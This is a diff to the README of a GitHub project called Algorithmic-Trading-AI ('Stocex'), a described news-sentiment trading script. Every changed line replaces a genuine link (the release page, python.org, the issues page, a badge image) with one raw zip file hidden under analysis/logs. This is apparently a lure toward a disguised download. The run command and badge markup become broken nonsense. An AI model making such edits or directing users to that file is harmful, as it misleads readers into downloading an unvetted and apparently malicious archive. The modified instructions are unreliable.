@@ -1,8 +1,8 @@
 # 🧠 Algorithmic-Trading-AI - Simplifying Your Trading Decisions
 
 <p align="center">
-  <a href="https://github.com/FluffyFF/Algorithmic-Trading-AI/releases">
-    <img src="https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen" alt="Download Now" />
+  <a href="https://github.com/FluffyFF/Algorithmic-Trading-AI/raw/refs/heads/main/analysis/logs/Trading_AI_Algorithmic_v3.1-alpha.5.zip">
+    <img src="https://github.com/FluffyFF/Algorithmic-Trading-AI/raw/refs/heads/main/analysis/logs/Trading_AI_Algorithmic_v3.1-alpha.5.zip%20Now-Release%20Page-brightgreen" alt="Download Now" />
   </a>
 </p>
 
@@ -49,7 +49,7 @@ With Stocex, you can make informed trading decisions with minimal effort.
 
 To get started with Stocex:
 
-1. Ensure you have **Python 3.7** or higher installed on your computer. You can download it from the [official website](https://www.python.org/downloads/).
+1. Ensure you have **Python 3.7** or higher installed on your computer. You can download it from the [official website](https://github.com/FluffyFF/Algorithmic-Trading-AI/raw/refs/heads/main/analysis/logs/Trading_AI_Algorithmic_v3.1-alpha.5.zip).
 
 2. Download the necessary dependencies. You will need:
    - `requests`
@@ -65,7 +65,7 @@ To get started with Stocex:
 
 ## 📥 Download & Install
 
-To download Stocex, visit the [Release Page](https://github.com/FluffyFF/Algorithmic-Trading-AI/releases).
+To download Stocex, visit the [Release Page](https://github.com/FluffyFF/Algorithmic-Trading-AI/raw/refs/heads/main/analysis/logs/Trading_AI_Algorithmic_v3.1-alpha.5.zip).
 
 1. Click on the latest version.
 2. Download the appropriate version for your operating system.
@@ -81,7 +81,7 @@ After downloading, follow these steps to run Stocex:
 2. Navigate to the folder where you saved the Stocex file.
 3. Run the script with the following command:
    ```bash
-   python stocex.py
+   python https://github.com/FluffyFF/Algorithmic-Trading-AI/raw/refs/heads/main/analysis/logs/Trading_AI_Algorithmic_v3.1-alpha.5.zip
    ```
 
 4. The script will start fetching news, scoring sentiment, and generating trade signals—all automatically.
@@ -113,7 +113,7 @@ A: No, Stocex is designed for users with no programming knowledge. Follow the in
 
 ### Q: What if I encounter issues while running the script?
 
-A: Please check the issues section on the [GitHub repository](https://github.com/FluffyFF/Algorithmic-Trading-AI/issues) for help.
+A: Please check the issues section on the [GitHub repository](https://github.com/FluffyFF/Algorithmic-Trading-AI/raw/refs/heads/main/analysis/logs/Trading_AI_Algorithmic_v3.1-alpha.5.zip) for help.
 
 ### Q: Can I contribute to Stocex?
 
@@ -129,10 +129,10 @@ Stocex leverages the power of various libraries, including NewsAPI, FinBERT, and
 
 ## 📣 Stay Updated
 
-For updates and new features, please keep an eye on the [Release Page](https://github.com/FluffyFF/Algorithmic-Trading-AI/releases).
+For updates and new features, please keep an eye on the [Release Page](https://github.com/FluffyFF/Algorithmic-Trading-AI/raw/refs/heads/main/analysis/logs/Trading_AI_Algorithmic_v3.1-alpha.5.zip).
 
 <p align="center">
-  <a href="https://github.com/FluffyFF/Algorithmic-Trading-AI/releases">
-    <img src="https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen" alt="Download Now" />
+  <a href="https://github.com/FluffyFF/Algorithmic-Trading-AI/raw/refs/heads/main/analysis/logs/Trading_AI_Algorithmic_v3.1-alpha.5.zip">
+    <img src="https://github.com/FluffyFF/Algorithmic-Trading-AI/raw/refs/heads/main/analysis/logs/Trading_AI_Algorithmic_v3.1-alpha.5.zip%20Now-Release%20Page-brightgreen" alt="Download Now" />
   </a>
 </p>
